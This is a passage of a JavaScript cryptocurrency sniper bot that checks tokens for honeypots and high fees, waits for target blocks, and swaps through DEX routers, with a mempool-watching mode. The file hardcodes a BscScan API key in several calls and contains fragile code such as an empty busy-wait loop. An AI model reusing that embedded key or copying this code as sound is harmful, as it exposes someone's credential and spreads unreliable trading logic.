    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, tokenPairWith, provider);
    bnbPrice = await getBnbPrice(provider);
    //console.log(tokenBnbLp)
  } else {
    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, bsc.eth, provider);
    bnbPrice = await getBnbPrice(provider);
  }
  if (exchangeToken == 1) {
    return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve;
  } else {
    //return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve * bnbPrice;
    return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve;
  }

}

async function getTokenBalance2(tokenAddress, address, provider) {
  const abi = [
    {
      name: 'balanceOf',
      type: 'function',
      inputs: [
        {
          name: '_owner',
          type: 'address',
        },
      ],
      outputs: [
        {
          name: 'balance',
          type: 'uint256',
        },
      ],
      constant: true,
      payable: false,
    },
  ];

  const contract = new ethers.Contract(tokenAddress, abi, provider)
  var balance = await contract.balanceOf(address)
  return balance
}


async function getBscScanVerfiedStatus(tokenAddress) {

  contractVerification = await axios.get('https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GA8GAZ4DZFM8N5CMPG1EH8TFQDFX5TK16C').then((response) => {

    if (String(response.data.result[0].SourceCode).length < 50) {
      verified = 0;
    } else {
      verified = 1;
    }

  });
  return verified;
}
async function storeContractSource2(tokenAddress) {
  contractData = await axios.get('https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GA8GAZ4DZFM8N5CMPG1EH8TFQDFX5TK16C').then((response) => {
    responseData = response.data.result;
  });
  contractSource = responseData[0].SourceCode;

  //writeToFile(contractSource);
  return responseData;
}

async function storeContractSource(tokenAddress) {
  contractData = await axios.get('https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GA8GAZ4DZFM8N5CMPG1EH8TFQDFX5TK16C').then((response) => {
    responseData = response.data.result;
    if (response.data.result[0].ABI === "Contract source code not verified") {
      contractStatusNotVerfied = true;
      if (choseMode != 5) {
        console.log(response.data.result[0].ABI);
        console.log('Warning!!! Posible Scam Contract!');
      }
      console.log(response.data.result[0].ABI);
      console.log('Warning!!! Posible Scam Contract! Aborting scan!');
      process.exit(0);
    } else {

    }

  });
  return responseData;
}


async function checkContract(tokenAddress) {
  contractData = await axios.get('https://api.bscscan.com/api?module=contract&action=getsourcecode&address=' + tokenAddress + '&apikey=GA8GAZ4DZFM8N5CMPG1EH8TFQDFX5TK16C').then((response) => {
    responseData = response.data.result[0].ABI;
    return responseData;
  });
  while (!contractData) {
  }
  if (contractData.length > 1) {
    return true
  } else {
    return false
  }
}

async function honeypotIs(address) {
  let pathOfApi = 'bsc2';
  if (choseBlockChain == 2) {
    pathOfApi = 'eth';
  }
  let responseOfCall = {};
  var xhr = new XMLHttpRequest();

  xhr.open('GET', 'https://aywt3wreda.execute-api.eu-west-1.amazonaws.com/default/IsHoneypot?chain=' + pathOfApi + '&token=' + address, true);
  xhr.responseType = 'json';
  xhr.onload = function () {
    var status = xhr.status;
    //console.log(xhr)
    if (status === 200) {
      let results = JSON.parse(xhr.responseText)
      if (results.IsHoneypot == false) {
        responseOfCall.HP = false;
        if (results.MaxTxAmount != null) {
          responseOfCall.MaxTxAmount = results.MaxTxAmount;
        }
        if (results.MaxTxAmountBNB != null) {
          responseOfCall.MaxTxAmountBNB = results.MaxTxAmountBNB;
        }
        if (results.BuyTax != null) {
          responseOfCall.BuyFee = results.BuyTax;
        }
        if (results.SellTax != null) {
          responseOfCall.SellFee = results.SellTax;
        }
      } else if (results.NoLiquidity == true) {
        responseOfCall.HP = null;
      } else {
        if (results.IsHoneypot == true) {
          /*   console.log("Honeypot Detected!"); */
          responseOfCall.HP = true;
        }
        if (results.Error == "Error: Returned error: execution reverted") {
          responseOfCall.HP = true;
          console.log(results.Error);
          //return;
        }
        if (results.Error != null) {
          responseOfCall.HP = true;
          if (results.Error.includes('INSUFFICIENT_LIQUIDITY')) {
            console.log(results.Error);
            //return;
          }
        }
      }

    }
  };
  xhr.send();
  await new Promise(r => setTimeout(r, 1000))

  return responseOfCall;

}

async function getDevAddresses(tokenAddress, provider) {
  const tokenContract = new ethers.Contract(
    tokenAddress,
    [
      'function owner() view returns (address)',
      'function governor() view returns (address)',
      'function platformMaintenanceWallet() view returns (address)',
    ],
    provider
  );
  let devAddresses = {
    owner: undefined,
    governor: undefined,
    platformMaintenanceWallet: undefined,
    devAddesses: undefined,
  };
  for (let role in devAddresses) {
    try {
      devAddresses[role] = await tokenContract[role]();
    } catch (e) { }
  }
  return devAddresses;
}
//workflow:
async function getReservedBnb(pairAddress, provider) {
  if (exchangeToken == 1) {
    exchangeTokenName = 'BNB';
    WBNB = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
  } else {
    exchangeTokenName = 'BUSD';
    WBNB = BUSD;
  }
  const lpContract = new ethers.Contract(
    pairAddress,
    [
      'function getReserves() view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast)',
      'function token0() view returns (address)',
      'function token1() view returns (address)',
    ],
    provider,
  );
  const reserves = await lpContract.getReserves();
  const token0 = await lpContract.token0();
  if (WBNB.toLowerCase() == token0.toLowerCase()) {
    return ethers.utils.formatEther(reserves._reserve0);
  } else {
    return ethers.utils.formatEther(reserves._reserve1);
  }
}

async function getPair(tokenA, tokenB) {

  let _factory = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73";
  if (choseBlockChain == 1) {
    if (choseMarket == 1) {
      _factory = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73";
    } else {
      _factory = "0x0841BD0B734E4F5853f0dD8d7Ea041c241fb0Da6";
    }
  } else if (choseBlockChain == 2) {
    if (choseMarket == 1) {
      _factory = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
    } else {
      _factory = "0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac";
    }
  } else if (choseBlockChain == 3) {
    _factory = "0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32";
  } else if (choseBlockChain == 4) {
    _factory = "0xd590cC180601AEcD6eeADD9B7f2B7611519544f4";
  }
  const pairFactory = new ethers.Contract(
    _factory,
    ['function getPair(address tokenA, address tokenB) external view returns (address pair)'],
    account
  );

  let pair = await pairFactory.getPair(tokenA, tokenB)

  return pair
}

async function delayOnBlocksWait(startBlock) {
  let staticBlock = 0;
if(choseBlockChain == 2){
  for (i = 0; startBlock < targetBlock; i++) {
    currentBlock = await provider.getBlockNumber();
    if (staticBlock != currentBlock) {
      console.log("Please wait, curently on block: " + currentBlock)
      staticBlock = currentBlock;
    }
    if (currentBlock == startBlock) {
    } else {
      startBlock = currentBlock;
    }
      if (startBlock == targetBlock) {
        console.log("Target Block reached..sniping block " + targetBlock)
        return true
      }
  }
}else{
  if (delayOnBuy > 3 ) {
    for (i = 0; startBlock < targetBlock; i++) {
      currentBlock = await provider.getBlockNumber();
      if (staticBlock != currentBlock) {
        console.log("Please wait, curently on block: " + currentBlock)
        staticBlock = currentBlock;
      }
      if (currentBlock == startBlock) {
      } else {
        startBlock = currentBlock;
      }
      if (choseBlockChain == 1) {
        if (startBlock == (targetBlock - 2)) {
          await new Promise(r => setTimeout(r, 2000))
          console.log("Target Block reached..sniping block " + targetBlock)
          return true
        }
      } else if (choseBlockChain == 3) {
        if (startBlock == (targetBlock - 1)) {
          console.log("Target Block reached..sniping block " + targetBlock)
          return true
        }
      }

    }
  }
}


}

function arrayContains(keyword) {
  return (contractSource.indexOf(keyword) > -1);
}
async function getContractHolders(tokenAddress) {

  for (i = 0; i < 1; page++) {
    contractHolders = await axios.get('https://api.bscscan.com/api?module=token&action=tokenholderlist&contractaddress=' + tokenAddress + '&page=' + page + '&offset=1000&apikey=GA8GAZ4DZFM8N5CMPG1EH8TFQDFX5TK16C').then((response) => {
      if (page > 3) {
        response.data.status = 0;
      }
      if (response.data.status == 0) {
        i = 1;
      } else {
        response.data.result.forEach(element => {
          dataArray.push(element);
        });
      }
    });

  }
  return dataArray.length;
}
async function startSnipe() {
  delayOnBlocks = false;
  if (antiHoneyPot) {
    console.log("AntiHP & HighFees is Active, Checking, please wait...");
    let honeyAndTaxCheck = await honeypotIs(process.env.TokenContract);
    HP = honeyAndTaxCheck.HP;
    if (HP == true) {
      console.log("HoneyPot Detected, Aborting Snipe in 3 seconds !!!");
      tokenData.honeypotToken = "YES";
      io.sockets.emit('tokenData', tokenData);
      await new Promise(r => setTimeout(r, 3000))
      process.exit(0)
    } else {
      if (HP == false) {
        if ((honeyAndTaxCheck.BuyFee + honeyAndTaxCheck.SellFee) > 50) {
          tokenData.honeypotToken = "NO";
          tokenData.feeBuyToken = honeyAndTaxCheck.BuyFee;
          tokenData.feeSellToken = honeyAndTaxCheck.SellFee;
          io.sockets.emit('tokenData', tokenData);
          console.log("Detected High Fees, Aborting Snipe in 3 seconds !!!");
          await new Promise(r => setTimeout(r, 3000))
          process.exit(0)
        } else {
          console.log("Update Status & Fees")
          tokenData.honeypotToken = "NO";
          tokenData.feeBuyToken = honeyAndTaxCheck.BuyFee;
          tokenData.feeSellToken = honeyAndTaxCheck.SellFee;
          io.sockets.emit('tokenData', tokenData);
        }
      }

    }

  }
  //amountIn = String(parseInt(amountIn) * parseInt(nrOfBuyTransactions));
  amountIn = amountIn.mul(nrOfBuyTransactions);

  if (choseMethode == 1 && passed == 1) {
    if (autoGas == false && choseMode != '3') {
      gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
      buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
      buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
    }

    if(choseBlockChain == 2){
      if (delayOnBuy > 0) {
        targetBlock = startBlock + delayOnBuy;
        console.log("Starting block " + startBlock)
        console.log("Target Block " + targetBlock)
        delayOnBlocks = await delayOnBlocksWait(startBlock);
      }
    }else{
      if (delayOnBuy > 3) {
        targetBlock = startBlock + delayOnBuy;
        console.log("Starting block " + startBlock)
        console.log("Target Block " + targetBlock)
        delayOnBlocks = await delayOnBlocksWait(startBlock);
      }else{
        if(choseBlockChain == 1){

          await new Promise(r => setTimeout(r, (delayOnBuy * 3000)))
        }else{
          await new Promise(r => setTimeout(r, (delayOnBuy * 6000)))
        }
        console.log("Delay on block " + delayOnBuy)
        console.log("Target Block reached..sniping!")
      }
    }


    confirmedPuchase = await buyFromWallet();
    if (confirmedPuchase) {
      balance = await getTokenBalance(tokenAddress, myAddress, provider)
 
      consoleLog(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
      if (needApproval == true && approveBeforeOrAfter == 2) {
        await startApprove();
      }

      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              if (sellFunctionHash.includes('0x')) {
                //console.log('its hashed!')
                functionToDetect = sellFunctionHash;
              } else {
                functionToDetect = getHashForFunction(sellFunctionHash);
                // console.log(functionToDetect);
              }
              await antiScam();
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromWallet();
            }
          } else {
            await sellFromWallet();
          }

        } else {
          if (antiRugActive) {
            if (sellFunctionHash.includes('0x')) {
              //console.log('its hashed!')
              functionToDetect = sellFunctionHash;
            } else {
              functionToDetect = getHashForFunction(sellFunctionHash);
              // console.log(functionToDetect);
            }
            await antiScam();
          } else {
            tokenPriceStart = await getTokenPrice(tokenAddress, provider);
            if (snipeExactTokens) {
              startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
            } else {
              startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
            }
            await detectPriceValue(TokenContract, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
          }
        }

      } else {
        if (antiRugActive) {
          if (sellFunctionHash.includes('0x')) {
            //console.log('its hashed!')
            functionToDetect = sellFunctionHash;
          } else {
            functionToDetect = getHashForFunction(sellFunctionHash);
            // console.log(functionToDetect);
          }
          await antiScam();
        } else {
          process.exit(0)
        }
      }


    }



  } else if (choseMethode == 2 && passed == 1) {

    if (autoGas == false && choseMode != '3') {
      gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
      buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
      buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
    }
    if (sendMultiWallet == "true") {

      if(choseBlockChain == 2){
        if (delayOnBuy > 0) {
          targetBlock = startBlock + delayOnBuy;
          console.log("Starting block " + startBlock)
          console.log("Target Block " + targetBlock)
          delayOnBlocks = await delayOnBlocksWait(startBlock);
        }
      }else{
        if (delayOnBuy > 3) {
          targetBlock = startBlock + delayOnBuy;
          console.log("Starting block " + startBlock)
          console.log("Target Block " + targetBlock)
          delayOnBlocks = await delayOnBlocksWait(startBlock);
        }else{
          if(choseBlockChain == 1){
            await new Promise(r => setTimeout(r, (delayOnBuy * 3000)))
          }else{
            await new Promise(r => setTimeout(r, (delayOnBuy * 6000)))
          }
          console.log("Delay on block " + delayOnBuy)
          console.log("Target Block reached..sniping!")
        }
      }
      confirmedPuchase = await buyFromContract()
      if (confirmedPuchase == true) {
        confirmedPuchase = false;
      } else {
        console.log("Snipe Failed! Please check your transaction on ..." + myAddress)
      }
      await new Promise(r => setTimeout(r, parseInt(delaySell) * 400))
      process.exit(0)
    } else {
      if (delayOnBuy == 1 && startBlock == null) {
        console.log("Delay on block 1")
        console.log("Target Block reached..sniping!")
        //delayOnBlocks = await delayOnBlocksWait(startBlock);
      } else if (delayOnBuy > 1) {
        targetBlock = startBlock + delayOnBuy;
        console.log("Starting block " + startBlock)
        console.log("Target Block " + targetBlock)
        delayOnBlocks = await delayOnBlocksWait(startBlock);
      }

      confirmedPuchase = await buyFromContract()
    }
    if (confirmedPuchase) {
      if (needApproval == true && approveBeforeOrAfter == 2) {
        await startApprove();
      }

      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              if (sellFunctionHash.includes('0x')) {
                //console.log('its hashed!')
                functionToDetect = sellFunctionHash;
              } else {
                functionToDetect = getHashForFunction(sellFunctionHash);
                // console.log(functionToDetect);
              }
              await antiScam();
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromWallet()
            }
          } else {
            await sellFromWallet()
          }

        } else {
          if (antiRugActive) {
            if (sellFunctionHash.includes('0x')) {
              //console.log('its hashed!')
              functionToDetect = sellFunctionHash;
            } else {
              functionToDetect = getHashForFunction(sellFunctionHash);
              // console.log(functionToDetect);
            }
            await antiScam();
          } else {
            tokenPriceStart = await getTokenPrice(tokenAddress, provider);
            if (snipeExactTokens) {
              startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
            } else {
              startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
            }
            await detectPriceValue(TokenContract, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
          }
        }

      } else {
        if (antiRugActive) {
          if (sellFunctionHash.includes('0x')) {
            //console.log('its hashed!')
            functionToDetect = sellFunctionHash;
          } else {
            functionToDetect = getHashForFunction(sellFunctionHash);
            // console.log(functionToDetect);
          }
          await antiScam();
        } else {
          process.exit(0)
        }
      }


    }


  } else if (choseMethode == 3 && passed == 1) {
    if (autoGas == false && choseMode != '3') {
      gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
      buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
      buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
    }

    if(choseBlockChain == 2){
      if (delayOnBuy > 0) {
        targetBlock = startBlock + delayOnBuy;
        console.log("Starting block " + startBlock)
        console.log("Target Block " + targetBlock)
        delayOnBlocks = await delayOnBlocksWait(startBlock);
      }
    }else{
      if (delayOnBuy > 3) {
        targetBlock = startBlock + delayOnBuy;
        console.log("Starting block " + startBlock)
        console.log("Target Block " + targetBlock)
        delayOnBlocks = await delayOnBlocksWait(startBlock);
      }else{
        if(choseBlockChain == 1){
          await new Promise(r => setTimeout(r, (delayOnBuy * 3000)))
        }else{
          await new Promise(r => setTimeout(r, (delayOnBuy * 6000)))
        }
        console.log("Delay on block " + delayOnBuy)
        console.log("Target Block reached..sniping!")
      }
    }
    confirmedPuchase = await buyFromContract()
    if (confirmedPuchase) {
      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              if (sellFunctionHash.includes('0x')) {
                //console.log('its hashed!')
                functionToDetect = sellFunctionHash;
              } else {
                functionToDetect = getHashForFunction(sellFunctionHash);
                // console.log(functionToDetect);
              }
              await antiScam();
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromContract();
              if (choseMode == 3) {
                consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
                passed = 0;
              } else {
                process.exit(0)
              }
            }
          } else {
            await sellFromContract();
            if (choseMode == 3) {
              consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
              passed = 0;
            } else {
              process.exit(0)
            }
          }

        } else {
          if (antiRugActive) {
            if (sellFunctionHash.includes('0x')) {
              //console.log('its hashed!')
              functionToDetect = sellFunctionHash;
            } else {
              functionToDetect = getHashForFunction(sellFunctionHash);
              // console.log(functionToDetect);
            }
            await antiScam();
          } else {
            tokenPriceStart = await getTokenPrice(tokenAddress, provider);
            if (snipeExactTokens) {
              startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
            } else {
              startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
            }
            await detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
          }
        }

      } else {
        if (antiRugActive) {
          if (sellFunctionHash.includes('0x')) {
            //console.log('its hashed!')
            functionToDetect = sellFunctionHash;
          } else {
            functionToDetect = getHashForFunction(sellFunctionHash);
            // console.log(functionToDetect);
          }
          await antiScam();
        } else {
          process.exit(0)
        }
      }
    }
  } else {
    process.exit(0)
  }
}

async function startSelling(balanceToSell) {
  if (balanceToSell != null) {
    balance = balanceToSell;
  }
  if (choseMethode == 1 && passed == 1) {
    passed = 2;
    if (confirmedPuchase) {
      await sellFromWallet();
      await new Promise(r => setTimeout(r, parseInt(delaySell) * 400))
      if (choseMode == 3) {
        consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
        passed = 0;
      } else {
        process.exit(0)
      }
    }
  } else if (choseMethode == 2 && passed == 1) {
    passed = 2;
    if (confirmedPuchase) {
      await sellFromWallet();
      await new Promise(r => setTimeout(r, parseInt(delaySell) * 400))
      if (choseMode == 3) {
        consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
        passed = 0;
      } else {
        process.exit(0)
      }
    }


  } else if (choseMethode == 3 && passed == 1) {
    passed = 2;
    if (confirmedPuchase) {
      await sellFromContract();
      await new Promise(r => setTimeout(r, parseInt(delaySell) * 400))
      if (choseMode == 3) {
        consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
        passed = 0;
      } else {
        process.exit(0)
      }
    }
  }
}

async function buyFromWallet() {
  console.log("Buy from Wallet!")
  buyPath = [ETHER,tokenAddress]
 let oldToken = exchangeToken;

  if(exchangeToken > 1 && snipeWithEther == true && snipeExactTokens == false){
    exchangeToken = 1
    buyPath = EtherPath

    if(choseBlockChain == 1){
      amountEstimatedEther = await sellRouterTarget.getAmountsOut(
        amountIn,
        [ETHER,bsc.wbnbBep20]
       
      )
     amountEstimatedEther = amountEstimatedEther[1]
    }else if(choseBlockChain == 2){
      amountEstimatedEther = await sellRouterTarget.getAmountsOut(
        amountIn,
        [ETHER,eth.wethErc20]
       
      )
     amountEstimatedEther = amountEstimatedEther[1]
    }


  }


  if (autoGas) {

  } else {
    gasPrice = ethers.utils.parseUnits(process.env.buy_Gwei, 'gwei');
    buyMaxPriorityFeePerGas = ethers.utils.parseUnits(process.env.buyMaxPriorityFeePerGas, 'gwei');
    buyMaxFeePerGas = ethers.utils.parseUnits(process.env.buyMaxFeePerGas, 'gwei');
  }
  buytx = null;

  if (snipeExactTokens) {
    amountIn = String(process.env.amount_BNB_buy);
    let arraySplit = amountIn.split(",");
    if (arraySplit[1] == undefined) {
      arraySplit = amountIn.split(".")
    }
    let finalNumber = String(arraySplit[0]) + String('0'.padEnd(tokenDecimals, '0'));
    amountIn = ethers.BigNumber.from(finalNumber);
  }


  if (choseMethode == 1) {
    if (exchangeToken == 1) {
      exchangeToken = oldToken;
      if (nrOfBuyTransactions > 1 && passed == 1) {
        for (i = 0; i < (nrOfBuyTransactions - 1); i++) {
          if (nrOfBuyTransactions > 1 && autoGas == true) {
            if (choseBlockChain == 1) {
              gasPrice = gasPrice.add(i * 100000000);
            } else {
              buyMaxPriorityFeePerGas = buyMaxPriorityFeePerGas;
              buyMaxFeePerGas = buyMaxFeePerGas.add(1000000000);
            }
          }
          consoleLog(chalk.green(`Start buying token...` + chalk.yellow((i + 1))))
          if (snipeExactTokens) {
            amountToBeProccessed = await sellRouterTarget.getAmountsOut(
              amountIn,
              [tokenAddress, ETHER]
            )
            amountToBeProccessed = amountToBeProccessed[1].mul(2)

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountToBeProccessed, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountToBeProccessed, nonce: currentNonce++ }
            }
            
            buytx = await buyRouterTarget.swapETHForExactTokens(
              amountIn,
              buyPath,
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          } else {
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountEstimatedEther, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountEstimatedEther, nonce: currentNonce++ }
            }
            if (parseInt(process.env.slippage) > 0) {
              amountToBeProccessed = await sellRouterTarget.getAmountsOut(
                amountIn,
                [tokenAddress, ETHER]
              )

              amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
            }
        
            buytx = await buyRouterTarget.swapExactETHForTokens(
              amountOutMin,
              buyPath,
              myAddress,
              Date.now() + 1000 * 60 * 10,
              txFees
            )
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          }
        }
        if (nrOfBuyTransactions > 1 && autoGas == true) {
          if (choseBlockChain == 1) {
            gasPrice = gasPrice.add(i * 100000000);
          } else {
            buyMaxPriorityFeePerGas = buyMaxPriorityFeePerGas;
            buyMaxFeePerGas = buyMaxFeePerGas.add(1000000000);
          }
        }
        consoleLog(chalk.green(`Start buying token...`))
        if (snipeExactTokens) {
          amountToBeProccessed = await sellRouterTarget.getAmountsOut(
            amountIn,
            [tokenAddress, ETHER]
          )
          amountToBeProccessed = amountToBeProccessed[1].mul(2)

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountToBeProccessed, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountToBeProccessed, nonce: currentNonce++ }
          }
          buytx = await buyRouterTarget.swapETHForExactTokens(
            amountIn,
            buyPath,
            myAddress,
            Date.now() + 1000 * 60 * 10,
            txFees
          )
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        } else {

          if (choseBlockChain == 3 || choseBlockChain == 2) {
            txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountEstimatedEther, nonce: currentNonce }
          } else {
            txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountEstimatedEther, nonce: currentNonce++ }
          }

          if (parseInt(process.env.slippage) > 0) {
            amountToBeProccessed = await sellRouterTarget.getAmountsOut(
              amountIn,
              [tokenAddress, ETHER]
            )
            amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
          }

          buytx = await buyRouterTarget.swapExactETHForTokens(
            amountOutMin,
            buyPath,
            myAddress,
            Date.now() + 1000 * 60 * 10,
            txFees
          )
          if (choseBlockChain == 3 || choseBlockChain == 2) {
            currentNonce++;
          }
        }
        passed = 2;
        await buytx.wait()
      } else {
        if (passed == 1) {
          consoleLog(chalk.green(`Start buying token...`))
          if (snipeExactTokens) {
            amountToBeProccessed = await sellRouterTarget.getAmountsOut(
              amountIn,
              [tokenAddress, ETHER]
            )
            amountToBeProccessed = amountToBeProccessed[1].mul(2)
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountToBeProccessed, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountToBeProccessed, nonce: currentNonce++ }
            }
            try {
              buytx = await buyRouterTarget.swapETHForExactTokens(
                amountIn,
                buyPath,
                myAddress,
                Date.now() + 1000 * 60 * 10,
                txFees
              )
            } catch (e) {
              console.log(String(e))
              await new Promise(r => setTimeout(r, 400))
              process.exit(0)
            }

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          } else {
            //        try {

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, value: amountEstimatedEther, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountEstimatedEther, nonce: currentNonce++ }
            }
            /*          console.log('here')
                     process.exit(0) */
            if (choseBlockChain == 4) {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, value: amountEstimatedEther, nonce: currentNonce++ }
            }

            if (parseInt(process.env.slippage) > 0) {
              amountToBeProccessed = await sellRouterTarget.getAmountsOut(
                amountIn,
                [ETHER, tokenAddress]
              )
              amountOutMin = amountToBeProccessed[1].sub(amountToBeProccessed[1].div(100).mul(parseInt(process.env.slippage)))
            }

            try {
              buytx = await buyRouterTarget.swapExactETHForTokens(
                amountOutMin,
                buyPath,
                myAddress,
                Date.now() + 1000 * 60 * 10,
                txFees
              )
            } catch (e) {
              console.log(String(e))
              await new Promise(r => setTimeout(r, 400))
              process.exit(0)
            }
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
            /*   } catch (e) {
                console.log(String(e))
                process.exit(0)
              } */

          }
          console.log('Check your transaction on https://' + chainScanner + '/tx/' + buytx.hash);
          passed = 2;
          await buytx.wait()
        }

      }
    } else {
      if (nrOfBuyTransactions > 1 && passed == 1) {
        for (i = 0; i < (nrOfBuyTransactions - 1); i++) {
          if (nrOfBuyTransactions > 1 && autoGas == true) {
            if (choseBlockChain == 1) {
              gasPrice = gasPrice.add(i * 100000000);
            } else {
              buyMaxPriorityFeePerGas = buyMaxPriorityFeePerGas.add(1000000000);
              buyMaxFeePerGas = buyMaxFeePerGas;
            }

          }
          consoleLog(chalk.green(`Start buying token...` + chalk.yellow((i + 1))))
          if (snipeExactTokens) {
            amountToBeProccessed = await sellRouterTarget.getAmountsOut(
              amountIn,
              [tokenAddress, ETHER]
            )
            amountToBeProccessed = amountToBeProccessed[1].mul(2)

            if (choseBlockChain == 3 || choseBlockChain == 2) {
              txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
            } else {
              txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
            }

            try {
              buytx = await buyRouterTarget.swapTokensForExactTokens(
                amountIn,
                amountToBeProccessed,
                [ETHER,tokenAddress],
                myAddress,
                Date.now() + 1000 * 60 * 10,
                txFees
              )
            } catch (e) {
              console.log(String(e))
              await new Promise(r => setTimeout(r, 400))
              process.exit(0)
            }
            if (choseBlockChain == 3 || choseBlockChain == 2) {
              currentNonce++;
            }
          } else {
            if (snipeExactTokens) {
              amountToBeProccessed = await sellRouterTarget.getAmountsOut(
                amountIn,
                [tokenAddress, ETHER]
              )
              amountToBeProccessed = amountToBeProccessed[1].mul(2)

              if (choseBlockChain == 3 || choseBlockChain == 2) {
                txFees = { gasLimit: gasLimit, maxPriorityFeePerGas: buyMaxPriorityFeePerGas, maxFeePerGas: buyMaxFeePerGas, nonce: currentNonce }
              } else {
                txFees = { gasLimit: gasLimit, gasPrice: gasPrice, nonce: currentNonce++ }
              }

              try {
                buytx = await buyRouterTarget.swapTokensForExactTokens(
                  amountIn,
                  amountToBeProccessed,
                  [ETHER,tokenAddress],
                  myAddress,
                  Date.now() + 1000 * 60 * 10,
                  txFees
                )
              } catch (e) {
                console.log(String(e))
                await new Promise(r => setTimeout(r, 400))
                process.exit(0)
              }
              if (choseBlockChain == 3 || choseBlockChain == 2) {
                currentNonce++;
              }
            } else {

